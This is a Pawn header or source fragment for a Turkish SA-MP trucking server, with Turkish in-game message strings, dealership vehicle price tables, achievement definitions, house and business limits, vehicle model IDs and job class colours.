#define TXT_LeaderInfoBar "Uye Sayisi: ~g~%i~w~, En Uzak Uye: ~g~%s~w~, Mesafe: ~r~%3.1f~w~"
#define TXT_MemberInfoBar "Lider: ~r~%s~w~, Mesafe: ~r~%3.1f~w~, Uye Sayisi: ~r~%i~w~"
#define TXT_CannotJoinJobStarted "{FFCC00}» {FFFFFF}Gorev Yapiyorsun Konvoy Komutlarini Kullanamassin. !"
#define TXT_ConvoyAllreadyJoined "{FFCC00}» {FFFFFF}Zaten Konvoydasin"
#define TXT_ConvoyNeedsTruckerClass "{FFCC00}» {FFFFFF}Kamyoncu veya Otobuscu olmaniz Gerekli."

// Timed messages
#define TXT_TimedRefuel "~r~DUYURU ~w~3 kati Skor ve Para kazanmaya ne dersin?  NOS takamýyor musun o zaman sen de hemen VIP ol ~r~ /vipbilgi"
#define TXT_TimedConvoy "~r~DUYURU ~w~Konvoy kurmak veya konvoya katilmak icin \"/convoy\" komutunu kullanabilirsiniz."
#define TXT_TimedGohome "~r~DUYURU ~w~Evine isinlanmak mi istiyorsun? \"/gohome\" komutunu kullanabilirsin."
#define TXT_TimedRentCar "~r~DUYURU ~w~Forumumuzu hala ziyaret etmediniz mi? ~r~www.canakkalefr.com"
#define TXT_TimedLicense "~r~DUYURU ~w~Otomatik gorevlerden biktin mi ? Ehliyet al ( San Fierro Surucu Kursu )"
#define TXT_TimedSpeedTraps "~r~DUYURU ~w~Sehir ici hiz limiti :  ~r~ 60 ~w~| Anayollar : ~r~ 90 ~w~| Otobanlar : ~r~ 120 ~w~Km/h 'dir "
#define TXT_TimedGoBusiness "~r~DUYURU ~w~Isyerine isinlamak mi istiyorsun? \"/gobus\" komutunu kullanabilirsin."

// TIRCILAR

// House-related
#define TXT_DefaultHouseName "%s 'in Evi"
#define TXT_PlayerBoughtHouse "{FFCC00}» {FFFFFF}Evi ${FFCC33}%i 'a Satin aldin"
#define TXT_PlayerOwnsMaxHouses "{{FFCC00}» {FFFFFF}Zaten 2 Tane evin Mevcut, baska ev alamassin"
#define TXT_ExitHouseReloadEnv "{FFCC00}» {FFFFFF}Esyalarin Yuklenmesi Bekleniyor"
#define TXT_PickupHouseOwned "{80FFFF}EV\n%s(%d) \n{DDDDDD}Sahip {FFC000}%s\n {DDDDDD}Ev Leveli:{FFC000}%i\n{DDDDDD}Ýçeri girmek için {ADFF2F}/icerigir"
#define TXT_PickupHouseForSale "{80FFFF}Satilik Ev (%d)\n \n{DDDDDD}Fiyat: {FFC000}$%i\n{DDDDDD}Max-level: {FFC000}%i\n{DDDDDD}Satýnalmak için {ADFF2F}/eval"
#define TXT_DialogOldHouseName "Eski Ev ismi: %s"
#define TXT_DialogEnterNewHouseName "Evine Yeni bir isim ver"
#define TXT_DialogSelectHouseUpgrade "Yukseltmeyi sec:"
#define TXT_HouseReachedMaxLevel "{FF0000}Evin zaten maximum levelde"
#define TXT_DialogBuyCarSelectClass "Arac Sinifi sec:"
#define TXT_HouseHasMaxVehicles "{FF0000}Evin Tum Arac Slotlari dolu"
#define TXT_AlreadyBoughtRecentVehicle "{FF0000}Zaten bi arac Aldin. \"/getcar\" Yaparak aracini alip ve Evinde \"/park\" yapabilirsin"
#define TXT_EmptyCarSlot "%s{FFFFFF}Bos Arac Slotu{FFFFFF}\n"
#define TXT_SelectVehicleToSell "Satmak istedigin Araci sec:"
#define TXT_SelectVehicleToGet "Yanina Cekmek istedin araci sec:"
#define TXT_NoHouseVehicles "{FF0000}Bu Evin hic Araci yok"
#define TXT_SureSellHouse "Evini $%i 'a Satmak istedignden Emin misin?"
#define TXT_AreYouSure "Emin misin?"
#define TXT_CannotSellHouseWithCars "{FF0000}Araci bulunan Evi Satamazsin"
#define TXT_PlayerUpgradedHouse "{00FF00}Evini %i Levele, $%i 'a Yukseltin"
#define TXT_CannotAffordUpgrade "{FF0000}Bu Yukselmteyi yapmak icin yeterince Paran yok"
#define TXT_NoHouseInSlot "{FF0000}Bu Slota Evin yok"
#define TXT_ChangedHouseName "{00FF00}Evin Ismini Degstirdin"
#define TXT_PlayerBoughtVehicle "{00FF00}{FFFF00}%s{00FF00} Aracini ${FFFF00}%i{00FF00}'a Satin aldin"
#define TXT_PlayerMustUseGetcarAndPark "{00FF00}Simdi Evden cik ve \"{FFFF00}/getcar{00FF00}\" yap. Ardindan \"{FFFF00}/park{00FF00}\" yaparak Evin onuna Park edebilrsin"
#define TXT_PlayerMustUsePark "{00FF00}Aracini Spawnladin. \"{FFFF00}/park{00FF00}\" Kulanarak park edebilirsiniz"
#define TXT_CannotAffordVehicle "{FF0000}Bu araci alman icin yeterince Paran yok"
#define TXT_PlayerSoldHouse "{00FF00}Evini Sattin"
#define TXT_PlayerSoldVehicle "{FFFF00}%s{00FF00} Aracini ${FFFF00}%i{00FF00}'a Sattin"
#define TXT_NoVehicleInSlot "{FF0000}Bu Slotta Aracin bulunmuyor"
#define TXT_DialogTitleBuyInsurance "Sigorta Al (Sigorta Yapilmadigi taktirde Araclarin patlar veya Suya Duserse Geri gelmez)"
#define TXT_DialogBuyInsurance "Tum Araclarini $%i 'a Sigortalamak istiyor musun?"
#define TXT_HouseAlreadyHasInsurance "{FFCC00}» {FFFFFF}Bu evin zaten Sigortasi bulunuyor"
#define TXT_PlayerBoughtInsurance "{FFCC00}» {FFFFFF}Tum araclar icin {FFCC00}$%i {FFFFFF}'a Dollara Sigorta Yapildi"
#define TXT_CannotAffordInsurance "{FFCC00}» {FFFFFF}Sigorta Yaptirmak icin Paran yetmiyor"

// Business related
#define TXT_PickupBusinessOwned "%s(%d)\n{FFFFFF}Isyeri Sahibi: {F8B808}%s\n{FFFFFF}Isyeri leveli: {FFFF00}%i\n{FF0000}/icerigir"
#define TXT_PickupBusinessForSale "%s(%d)\n{FFFFFF}Satilik Isyeri:\n{18CF00}$%i\n{FFFFFF}Kazanc: {18CF00}$%i\n{FF0000}/buybus"
#define TXT_DefaultBusinessName "%s'in Isyeri"
#define TXT_PlayerBoughtBusiness "{33FF33}Isyerini ${FFCC33}%i'a Satin aldin"
#define TXT_PlayerOwnsMaxBusinesses "{FF0000}Zaten 2 Tane Isyerin var"
#define TXT_NoBusinessInSlot "{FF0000}Bu slotta Isyerin yok"
#define TXT_NoevSlot "{FF0000}Bu slotta Ev yok"
#define TXT_DialogOldBusinessName "Eski Isyeri ismi: %s"
#define TXT_DialogEnterNewBusinessName "Isyerine Yeni bir isim ver"
#define TXT_ChangedBusinessName "{00FF00}Isyerinin Ismini Degstirdin"
#define TXT_BusinessReachedMaxLevel "{FF0000}Isyeri zaten Maksimum levelde"
#define TXT_SureSellBusiness "Isyerini $%i'a Satmak istedignden eminmisin?"
#define TXT_PlayerSoldBusiness "{00FF00}Isyeri Satildi"
#define TXT_PlayerSoldBusiness "{00FF00}Isyeri Satildi"

// Dolmus related
#define TXT_PlayerCompletedDolmusLine "{66FFFF}Dolmuþ Soforu{FF0000} %s{66FFFF} HAT %i Gorevini basariyla tamamladi."
#define TXT_DolmusDriverReward "~g~Alinan $%i~w~"
#define TXT_Dolmusvipbonus "{FFFF00}[BILGI] {009D4F}VIP bonusu: $%i"
#define TXT_DolmusDriverMustEnterDolmus "{FF0000}Bir dolmuþ almalisiniz."

#define TXT_DolmusDriverMissionPassed "Gorev Tamamlandi" // Define the game-text that shows when the player passed a busdriver mission
#define TXT_SelectDolmusRoute "{FFCC00}» {FFFFFF}Dolmusun rotayi secin:"
#define TXT_DolmusdriverAlreadyDoingJob "{FFCC00}» {FFFFFF}Zaten calisiyorsunuz."

// METO DEFINE
//gta 5 teleport

new Float:tpp[MAX_PLAYERS][4],Float:ttp[MAX_PLAYERS][3]; // saves start and end coordinates

// < Anti Troll > ==============================================================
#define MAX_VEHICLE_ID_CHANGES 				5
new LastVehicleID33[MAX_PLAYERS];
new VehicleIDChanges[MAX_PLAYERS];
new VehicleIDChangeTime[MAX_PLAYERS];


//---------- m1 m2
//TeaMStar
new objecount[MAX_VEHICLES+1];
new Araba[MAX_PLAYERS];
new ivehicle[MAX_PLAYERS];
new ob[MAX_VEHICLES+1][11];

// < Anti Nick Deðiþtirme > ====================================================
new SonNick[MAX_PLAYERS][40],
	NickDegisimS[MAX_PLAYERS],
	NickDegisimT[MAX_PLAYERS];

// < Anti Incoming Connection > ================================================
new SonGIP[40],
	IPTime,
	IPSayi;

// < Araç Sistemi > ============================================================
enum AracInfo
{
	bool:AracStatic,
	bool:AracKira,
	AracKiralayan,
	bool:AracInSHP,
	AracSHPID,
	AracR1,
	AracR2,
	AracPJ,
	bool:AracNOS,
	AracGR1,
	AracGR2,
	AracGPJ,
	bool:AracGNOS,
	AracNeon,
	AracNeonObj[2],
	bool:AracKaravan,
	AracKaravanObj,
	Text3D:AracKaravan3D
};

new Araclar[MAX_VEHICLES][AracInfo];

// < Araç Sahiplik Sistemi > ===================================================
#define MAX_SHP_ARAC                        50000
#define MAX_GALERI                          40
#define MAX_OYUNCU_ARAC                     7

#define SahibisinTXT                     	"%s Model aracýn sahibisin, Aracýn Kilometresi: [ %.2f ]"
#define AracinSahibiKMTXT                   "{FFCC00}» {FFFFFF}Aracýn Sahibi: [ {FFCC00}%s{FFFFFF} ], Aracýn Kilometresi: [ %.2f ]."
#define MotorBildirimi                   	"{FFCC00}» {FFFFFF}Aracý çalýþtýrmak için '{FFCC00}N{FFFFFF}' tuþuna basabilir veya '{FFCC00}/motor  & /engine{FFFFFF}' yazabilirsiniz."


#define GALERI_DIZIN                        "ServerData/Galeriler"

#define DialogGaleriEkle                    310
#define DialogGaleriSatinAl                 311
#define DialogOyuncuAracList                312
#define DialogOyuncuAracMenu                313
#define DialogOyuncuAracPlaka               314
#define DialogOyuncuAracSat                 315

#define Galeri_Otomobil                     0
#define Galeri_Motosiklet                   1
#define Galeri_Tekne                        2
#define Galeri_HavaAraci                    3
#define Galeri_Karavan                      4

new PlayerText:UI_AKBG[MAX_PLAYERS],
	PlayerText:UI_AKItemBG[MAX_PLAYERS][6],
	PlayerText:UI_AKItemModel[MAX_PLAYERS][6],
	PlayerText:UI_AKItemInfo[MAX_PLAYERS][6],
	PlayerText:UI_AKPrev[MAX_PLAYERS],
	PlayerText:UI_AKNext[MAX_PLAYERS],
	PlayerText:UI_AKSayfa[MAX_PLAYERS];

enum AracSHPInfo
{
	ASHPModel,
	ASHPSahip[50],
	Float:ASHPX,
	Float:ASHPY,
	Float:ASHPZ,
	Float:ASHPRot,
	ASHPRenk1,
	ASHPRenk2,
	ASHPFiyat,
	ASHPIzin,
	ASHPPlaka[50],
	ASHPPJ,
	ASHPNOS,
	ASHPMod[14],
	ASHPNeon,
	ASHPVehID,
	ASHPNeonObj,
	ASHPKaravan,
	bool:ASHPExist,
	bool:ASHPNeedSave,
	Float:KM
};

new AracSHP[MAX_SHP_ARAC][AracSHPInfo];
new Iterator:ASHPs<MAX_SHP_ARAC>;

new AYItemID[MAX_PLAYERS][MAX_OYUNCU_ARAC],
	AYSItemID[MAX_PLAYERS];

enum GaleriInfo
{
	GType,
	Float:GX,
	Float:GY,
	Float:GZ,
	GPick,
	Text3D:G3D,
	GMapIcon,
	GExist
};

new Galeri[MAX_GALERI][GaleriInfo];
new Iterator:Gs<MAX_GALERI>;

new GaleriTip[MAX_PLAYERS],
	bool:Galeride[MAX_PLAYERS],
	GaleriSayfa[MAX_PLAYERS],
	GaleriItemID[MAX_PLAYERS][6],
	GaleriSItem[MAX_PLAYERS];

enum GAracInfo
{
	GAracName[60],
	GAracModel,
	GAracLevel,
	GAracUcret
};

new OTAGalerisi[80][GAracInfo]={
// Model Ýsmi       Model ID    // Gereken Level    // Ücret
{"Esperanto", 		419,		3,					10000000}, // 10M
{"Sadler", 			543,		4,					11000000}, //11M
{"Broadway", 		575,		3,					15000000}, //15M
{"Tampa", 			549,		4,					20000000}, //20M
{"Clover", 			542,		4,					21000000}, //21M
{"Bravura", 		401,		3,					10000000}, //10M
{"Cadrona", 		527,		3,					10000000}, //10M
{"Previon", 		436,		3,					10000000}, //10M
{"Hermes", 			474,		5,					30000000}, //30M
{"Intruder", 		546,		3,					10000000}, //10M
{"Manana", 			410,		3,					10000000}, //10M
{"Nebula", 			516,		3,					13000000}, //13M
{"Virgo", 			491,		3,					20000000}, //20M
{"Yosemite", 		554,		4,					30000000}, //30M
{"Perennial", 		404,		3,					15000000}, //15M
{"Moonbeam", 		418,		3,					35000000}, //35M
{"Sabre", 			475,		6,					37000000}, //37M
{"Stallion", 		439,		3,					12000000}, //12M
{"Blista Compact", 	496,		3,					11000000}, //11M
{"Blade", 			536,		15,					38000000}, //38M
{"Tornado", 		576,		9,					36000000}, //36M
{"Voodoo", 			412,		4,					18000000}, //18M
{"Rancher", 		489,		6,					22000000}, //22M
{"Picador", 		600,		5,					17000000}, //17M
{"Bobcat", 			422,		5,					13000000}, //13M
{"Buccaneer", 		518,		3,					17000000}, //17M
{"Admiral", 		445,		5,					20000000}, //20M
{"Glendale", 		466,		5,					22000000}, //22M
{"Greenwood", 		492,		4,					25000000}, //25M
{"Oceanic", 		467,		4,					23000000}, //23M
{"Willard", 		529,		4,					20000000}, //20M
{"Vincent", 		540,		4,					19000000}, //19M
{"Primo", 			547,		4,					17000000}, //17M
{"Washington", 		421,		4,					15000000}, //15M
{"Regina", 			479,		4,					24000000}, //24M
{"Solair", 			458,		4,					23000000}, //23M
{"Tahoma", 			566,		9,					35000000}, //35M
{"Savanna", 		567,		15,					40000000}, //40M
{"Fortune", 		526,		3,					10000000}, //10M
{"Club", 			589,		32,					50000000}, //50M
{"Mesa", 			500,		7,					20000000}, //20M
{"Feltzer", 		533,		3,					13000000}, //13M
{"Sentinel", 		405,		4,					16000000}, //16M
{"Sunrise", 		550,		5,					24000000}, //24M
{"Premier", 		426,		14,					35000000}, //35M
{"Elegant", 		507,		4,					17000000}, //17M
{"Merit", 			551,		6,					19000000}, //19M
{"Emperor", 		585,		10,					18000000}, //18M
{"Landstalker", 	400,		10,					20000000}, //20M
{"Flatbed", 		455,		10,					29000000}, //29M
{"Alpha", 			602,		30,					30000000}, //30M
{"Euros", 			587,		30,					40000000}, //40M
{"ZR-350", 			477,		30,					40000000}, //40M
{"Buffalo", 		402,		30,					50000000}, //50M
{"Super GT", 		506,		30,					50000000}, //50M
{"Windsor", 		555,		30,					40000000}, //40M
{"Comet", 			480,		30,					55000000}, //55M
{"BF Injection", 	424,		30,					45000000}, //45M
{"Banshee", 		429,		30,					60000000}, //60M
{"Flash", 			565,		30,					50000000}, //50M
{"Jester", 			559,		30,					45000000}, //45M
{"Phoenix", 		603,		30,					40000000}, //40M
{"Uranus", 			558,		30,					40000000}, //40M
{"Remington", 		534,		30,					38000000}, //38M
{"Slamvan", 		535,		30,					36500000}, //36.5M
{"Sultan", 			560,		50,					60000000}, //60M
{"Stratum", 		561,		30,					30000000}, //30M
{"Huntley", 		579,		45,					50000000}, //50M
{"Stafford", 		580,		30,					45000000}, //45M
{"Elegy", 			562,		30,					60000000}, //60M
{"Sandking", 		495,		40,					57000000}, //57M
{"Bandito", 		568,		40,					30000000}, //30M
{"Bloodring Banger",504,		40,					30000000}, //30M
{"Turismo", 		451,		40,					70000000}, //70M
{"Cheetah", 		415,		40,					70000000}, //70M
{"Bullet", 			541,		40,					70000000}, //70M
{"HotringRacerA", 	494,		50,					60000000}, //60M
{"HotringRacerB", 	502,		50,					60000000}, //60M
{"HotringRacerC", 	503,		50,					60000000}, //60M
{"Infernus", 		411,		60,					100000000} //100M
};

new MBGalerisi[12][GAracInfo]={
// Model Ýsmi       Model ID    // Gereken Level    // Ücret
{"Bike", 			509,		3,					1000000}, //1M
{"BMX", 			481,		3,					1000000}, //1M
{"Mountain Bike", 	510,		3,					3000000}, //3M
{"Faggio", 			462,		3,					15000000}, //15M
{"Wayfarer", 		586,		3,					20000000}, //20M
{"Freeway", 		463,	    22,					50000000}, //50M
{"Sanchez", 		468,		23,					50000000}, //50M
{"Quad", 			471,		3,					20000000}, //20M
{"PCJ-600", 		461,		25,					55000000}, //55M
{"BF-400", 			581,		20,					40000000}, //40M
{"FCR-900", 		521,		35,					60000000}, //60M
{"NRG-500", 		522,		60,					100000000} //100M
};

new TGalerisi[8][GAracInfo]={
// Model Ýsmi       Model ID    // Gereken Level    // Ücret
{"Marquis", 		484,		20,					30000000}, //30M
{"Dinghy", 			473,		22,					30000000}, //30M
{"Coastguard", 		472,		23,					40000000}, //40M
{"Reefer", 			453,		24,					40000000}, //40M
{"Speeder", 		452,		20,					40000000}, //40M
{"Jetmax", 			493,		70,					70000000}, //70M
{"Tropic", 			454,		27,					50000000}, //50M
{"Squallo", 		446,		55,					80000000} //80M
};

new HAGalerisi[7][GAracInfo]={
// Model Ýsmi       Model ID    // Gereken Level    // Ücret
{"Dodo", 			593,		10,					30000000}, //30M
{"Cropduster", 		512,		10,					30000000}, //30M
{"Sparrow", 		469,		10,					40000000}, //40M
{"Beagle", 			487,		10,					30000000}, //30M
{"Maverick", 		487,		10,					45000000}, //45M
{"Shamal", 			519,		30,					40000000}, //40M
{"Stuntplane", 		513,		50,					55000000} //55M
};

// < Karavan Sistemi > =========================================================
#define DialogKaravan   					573

new pKaravan[MAX_PLAYERS];

//
// < EXP Sistemi > =============================================================
new	Level[MAX_PLAYERS],
	EXP[MAX_PLAYERS],
	SilahUyari[MAX_PLAYERS],
	SilahUyariM[MAX_PLAYERS];

new PlayerText:UI_Rank[MAX_PLAYERS][4];
new OncekiRank[MAX_PLAYERS], OncekiEXP[MAX_PLAYERS];

// < Baþarým Sistemi > =========================================================
#define MerakliOyuncuAch                    0 // Eklendi
#define HirsliOyuncuAch                     1 // Eklendi
#define DaimiOyuncuAch                      2 // Eklendi 
#define ServerEmektariAch                   3 // Eklendi 
#define YatirimciAch                  		4 // Eklendi 
#define AtNaliAch                           5 // Eklendi
#define ArabaSevdasiAch                     6 // Eklendi
#define EvimAch                             7 // Eklendi 
#define DayiyaSorAch                        8 // Eklendi 
#define CopcuAch                            9  // Eklendi
#define KargocuAch                          10 // Eklendi
#define PizzaciAch                          11 // Eklendi
#define PolisAch                            12 // Eklendi
#define KamyoncuAch                         13 // Eklendi
#define PilotAch                            14 // Eklendi
#define OtobuscuAch                         15 // Eklendi
#define ItfaiyeciAch                        16 // Eklendi
#define DolmuscuAch                         17 // Eklendi 
#define MafyaAch                            18 // Eklendi 
#define GemiciAch                           19 // Eklendi 
#define BankaciAch                          20 // Eklendi 
#define CevikAdamAch                        21 // Eklendi GivePlayerAchievement(playerid, CevikAdamAch, 1); // Baþarým Sistemi
#define FedakarYardimciAch                  22 // Eklendi 


// < Selfie Sistemi > ==========================================================
new takingselfie[MAX_PLAYERS];

new Float:xxx[MAX_PLAYERS],Float:yyy[MAX_PLAYERS],Float:zzz[MAX_PLAYERS],Float:aaa[MAX_PLAYERS];
new Float:nyyy[MAX_PLAYERS],Float:nzzz[MAX_PLAYERS];
new righttt[MAX_PLAYERS];
new lefttt[MAX_PLAYERS];

//======


#define COLOR_CYAN   0x00FFFFFF
#define COLOR_ORANGE 0xFFA500FF
#define HOLDING(%0) \
	((newkeys & (%0)) == (%0))
new MotorMOD[MAX_VEHICLES];
new StopTime[MAX_PLAYERS];

enum AchInfo
{
	AchName[60],
	AchBilgi[100],
	AchMiktar
};

new Basarimlar[23][AchInfo]={
// Baþarým              	Açýklama                                    	Miktar
{"Merakli Oyuncu",          "Sunucumuzda 1 saat oyna!",                    		 1},
{"Hirsli Oyuncu",           "Sunucumuzda 10 saat oyna!",                   	 	10},
{"Daimi Oyuncu",            "Sunucumuzda 24 saat oyna!",                   	 	24},
{"Server Emektari",         "Sunucumuzda 240 saat oyna!",                 	  	240},
{"Yatirimci Oyuncu", 		"Panelden bir urun satin al!", 						1},
{"At Nali", 				"Lotto'dan odul kazan!", 							1},
{"Araba Sevdasi",       	"Ilk aracini satin al!",                    		1},
{"Evim Evim Guzel Evim",	"Ilk evini satin al!",                      		1},
{"Aha Dayiya Sor",          "Yoneticiye soru sor!",                         	1},
{"Copculer Krali",      	"Copculuk mesleginde yuksek basari goster!",    	1},
{"Aninda Teslim",           "Kargocu mesleginde yuksek basari goster!",         1},
{"Evlere Servis",           "Pizzaci mesleginde yuksek basari goster!",         1},
{"Riza Baba",           	"Polis mesleginde yuksek basari goster!",       	1},
{"Yollarin Krali",      	"Kamyonculuk mesleginde yuksek basari goster!", 	1},
{"Kaptan Pilot",        	"Pilot mesleginde yuksek basari goster!",       	1},
{"Yularimi Verin",      	"Otobusculuk mesleginde yuksek basari goster!", 	1},
{"Sehir Koruyucusu",    	"Itfaiyecilik mesleginde yuksek basari goster!",	1},
{"Dolmuscular Krali",    	"Dolmusculuk mesleginde yuksek basari goster!",		1},
{"Mafya Babasi",    		"Mafya mesleginde yuksek basari goster!",			1},
{"Hadi Kaptan!",    		"Gemicilik mesleginde yuksek basari goster!",		1},
{"Money Money",    			"Bankaci mesleginde yuksek basari goster!",			1},
{"Cevik Polis",    			"Cevik Kuvvet mesleginde yuksek basari goster!",	1},
{"Fedakar Yardimci",    	"Bir oyuncunun sorusuna yardim et!",				1}
};

//======================== [ Yeni Duyuru Sistemi ] =============================
/*
new Text:Event0[MAX_PLAYERS];
new Text:Event1[MAX_PLAYERS];
new Text:Event2[MAX_PLAYERS];
new Text:Event3[MAX_PLAYERS];
new Text:Event4[MAX_PLAYERS];
new Text:Event5[MAX_PLAYERS];
new EventBase;
new eventT_0,eventT_1,eventT_2,eventT_3,eventT_4,eventT_5;
*/
//==============================================================================
new Text:Event0;
new Text:Event1;
new Text:Event2;
new Text:Event3;
new Text:Event4;
new Text:Event5;
new EventBase;
new eventT_1,eventT_2,eventT_3,eventT_4,eventT_5;
// ************************************************************************************************************************************************************
// PPC_ServerSettings
// ************************************************************************************************************************************************************

// Default max number of players is set to 500, re-define it to 200
#undef MAX_PLAYERS
#define MAX_PLAYERS 200

// Set timer-delay for exiting houses (this timer freezes a player when he exits a house, this allows the game to load the environment
// before the player starts to fall, also the player's vehicles assigned to the house he exits from, are respawned by this timer)
new ExitHouseTimer = 1000;
new ExitBusinessTimer = 1000;
//hgs timer
//Global:
//new MoneyTimer[MAX_PLAYERS] = {-1,...};

// This allows you to toggle the red houses on the map (bought houses appear on the map as red house icons when this is set to "true")
new bool:ShowBoughtHouses = true;

// Define maximum fuel amount (default: 5000) and maximum price for a complete refuel (default: 1000)
// Changing MaxFuel changes how fast a vehicle will run without fuel
//      (setting it to 2500 for example, let's vehicles run out of fuel twice as fast)
// RefuelMaxPrice is the price you pay for a total refuel (when the vehicle has no more fuel), the price to pay is calculated
//      by the amount of fuel to refuel (pay 50% of RefuelMaxPrice when vehicle has half a fuel-tank left)
new MaxFuel = 3000;
new RefuelMaxPrice = 2000;

// Define housing parameters
#define MAX_HOUSES					2000 // Defines the maximum number of houses that can be created
#define MAX_HOUSESPERPLAYER			3 // Defines the maximum number of houses that any player can own
#define HouseUpgradePercent         70 // Defines the percentage for upgrading a house (house of 10m can be upgraded for 5m when set to 50)
#define ParkRange                   150.0 // Defines the range for parking the vehicle around the house (default = 150m)
// Define business parameters
#define MAX_BUSINESS                2000 // Defines the maximum number of businesses that can be created
#define MAX_BUSINESSPERPLAYER		3 // Defines the maximum number of businesses that any player can own
// Defines for the toll-system
#define MAX_TOLLGATES				200
// Defines for the speedcameras
#define MAX_CAMERAS     			1000

#define MAX_MP3                2000
#define MAX_RADYO                2000

// Defines for police
//new bool:PoliceGetsWeapons = true;
// These are the weapons that a police player will get when "PoliceGetsWeapons = true"
// 5 = Baseball Bat
// 24 = Desert Eagle
// 25 = Shotgun
// 28 = Micro SMG
// 30 = AK-47
// 34 = Sniper Rifle
// 38 = Minigun - 35 = Rocket Launcher
// 39 = Satchel Charge
// 41 = Spraycan
// 10 = Purple Dildo
// 46 = Parachute
// 40 = Detonator
//new APoliceWeapons[1] = {46};
//new PoliceWeaponsAmmo = 1;
// Arme FBI

// Client Giriþi

new ClientMode;

//==========


new bool:FBYGetsWeapons = true;
new AFBYWeapons[12] = {24, 32, 46, 34};
new FBYWeaponsAmmo = 200;

// Jailing system variables
new DefaultJailTime = 120; // Set default jailtime to 2 minutes
new DefaultFinePerStar = 1000; // Set the fine for each wanted level (star)
new DefaultWarnTimeBeforeJail = 60; // Allow the wanted player 60 seconds to pull over (always set this value to multiples of 5: 5, 10, 15, 20, ...)
// Unclamp price per vehicle
new UnclampPricePerVehicle = 20000;

// Pizza Boy variables
new Float:PboyJobRange = 1000.0;
new Bani = 2000;

// ************************************************************************************************************************************************************
// PPC_Defines
// ************************************************************************************************************************************************************

// Define path to player's account-files
#define PlayerFile "ServerData/Players/Player_%s.ini"
#define HouseFile "ServerData/Houses/House_%i.ini"
#define CameraFile "ServerData/Cameras/Camera_%i.ini"
#define BusinessFile "ServerData/Business/Business_%i.ini"
#define BankFile "ServerData/Bank/Bank_%s.ini"

//Conducator Tren
#define VehicleTren				538// Tren:Tren

// Define vehicles
#define VehicleFlatbed			455 // Truck: Flatbed
#define VehicleDFT30			578 // Truck: DFT-30
#define VehicleCementTruck		524 // Truck: Cementtruck
#define VehicleLineRunner		403 // Truck: LineRunner
#define VehicleTanker			514 // Truck: Tanker
#define VehicleRoadTrain		515 // Truck: RoadTrain
#define VehicleTrailerCargo		435 // Trailer: cargo
#define VehicleTrailerCargo2	591 // Trailer: cargo
#define VehicleTrailerOre		450 // Trailer: Ore
#define VehicleTrailerFluids	584 // Trailer: Fluids
#define VehicleCamper		 	483 // Camper
#define VehicleCoach			437 // Bus
#define VehicleShamal           519 // Plane: Shamal
#define VehicleNevada           553 // Plane: Nevada
#define VehicleStuntPlane       513 // Plane: Stuntplane
#define VehicleDodo       		593 // Plane: Dodo
#define VehicleAT400           	577 // Plane : AT400
#define VehicleAndromada        592 // Plane: Andromada
#define VehicleMaverick         487 // Helicopter: Maverick
#define VehicleCargobob         548 // Helicopter: Cargobob
#define VehiclePoliceLSPD       596 // Police Car Los Santos Police Department
#define VehiclePoliceSFPD       597 // Police Car San Fierro Police Department
#define VehiclePoliceLVPD       598 // Police Car Las Venturas Police Department
#define VehicleHPV1000          523 // Police motorcycle
#define VehiclePoliceRanger     599 // Police Ranger
#define VehicleSandKing			495 // Mafia-van: Sandking
#define VehicleMoonbeam         418 // Mafia-van: Moonbeam
#define VehicleBike             509 // Bike: Bike
#define VehicleBMX              481 // Bike: BMX
#define VehicleMountainBike     510 // Bike: Mountain Bike
#define VehicleFaggio           462 // Bike: Faggio
#define VehiclePboy         	448 // Bike: Pizzaboy
#define VehiclePizzaBoy         448 // Bike: Pizzaboy
#define VehicleBF400            581 // Bike: BF-400
#define VehicleNRG500           522 // Bike: NRG-500
#define VehiclePCJ600           461 // Bike: PCJ-600
#define VehicleFCR900           521 // Bike: FCR-900
#define VehicleFreeway          463 // Bike: Freeway
#define VehicleWayfarer         586 // Bike: Wayfarer
#define VehicleSanchez          468 // Bike: Sanchez
#define VehicleQuad             471 // Bike: Quad
#define VehicleCoastguard		472 // Boat: Coastguard
#define VehicleDinghy			473 // Boat: Dinghy
#define VehicleJetmax			493 // Boat: Jetmax
#define VehicleLaunch			595 // Boat: Launch
#define VehicleMarquis			484 // Boat: Marquis
#define VehiclePredator			430 // Boat: Predator
#define VehicleReefer			453 // Boat: Reefer
#define VehicleSpeeder			452 // Boat: Speeder
#define VehicleSquallo			446 // Boat: Squallo
#define VehicleTropic			454 // Boat: Tropic
#define VehicleRhino            432 // Tank: Rhino
#define VehiclePatriot          470 // Jeep: Patriot
#define VehicleTowTruck         525 // Towtruck
#define VehicleBurrito          482 // Van: Burrito
#define VehicleFaggio           462 // Bike: Faggio
#define VehicleBenson           499 // Truck: Benson
#define VehicleDozer            486 // Dozer
#define VehicleUtilityVan       552 // Utility Van
#define VehicleUtilityTrailer   611 // Utility trailer
//Gunoier Cars

#define VehicleTrash		    408 // Car:Trash

//BankaciCars

#define VehicleSecuricar		428 // Car:securicar

//BankaciCars

#define VehicleFiretruck		407 // Car:securicar

// FBI Masini

#define VehicleFBIRancher		490 // Van: FBY

#define VehicleFBITruck			528 // VanTruck: FBY

#define VehicleSWAT		    	601 // Van: FBY

#define VehicleEnforcer         427 // Van: FBY

//pboy pizza
#define VehiclePboy         	448 // Bike: Pizzaboy

// Define player-class AND vehicle statements to use for missions (PCV = PlayerClass and Vehicle)
#define PCV_TruckerOreTrailer			1
#define PCV_TruckerFluidsTrailer     	2
#define PCV_TruckerCargoTrailer      	3
#define PCV_TruckerCementTruck       	4
#define PCV_TruckerNoTrailer         	5
#define PCV_PilotPlane               	6
#define PCV_PilotHelicopter          	7
#define PCV_MafiaVan                 	8
#define PCV_GTrash                      9
#define PCV_BankaSecuricar              10
#define PCV_FireFiretruck               11

// Define classes
#define ClassTruckDriver 1
#define ClassBusDriver 2
#define ClassPilot 3
#define ClassPolice 4
#define ClassMafia 5
#define ClassRoadWorker 6
#define ClassGemici 7
#define ClassOduncu 8
#define ClassBalikci 9
#define ClassCopcu 10
#define ClassFBY 11
#define ClassBanka 12
#define ClassFire 13
#define ClassPboy 14
#define ClassKargocu 15
#define ClassDolmusDriver 16

// Defines for all classes
#define Job_TimeToFailMission   	60

// Define class-colors
#define ColorClassTruckDriver		0xFFFF00AA // Orange
#define ColorClassBusDriver			0xFF8000FF // Light blue
#define ColorClassPilot             0x008080FF // Dark blue
#define ColorClassPolice			0x0000FFFF // Blue
#define ColorClassMafia				0x8000FFFF // Purple
#define ColorClassRoadWorker        0xFFFF80FF // Light yellow
#define ColorClassGemici			0x80FFFFFF // Light blue
#define ColorClassOduncu			0x228B22FF // Dark green ( Forest Green )
#define ColorClassBalikci			0x80FFFFFF // Light blue
#define ColorClassCopcu         	0xCE576DAA // Negru spre maro
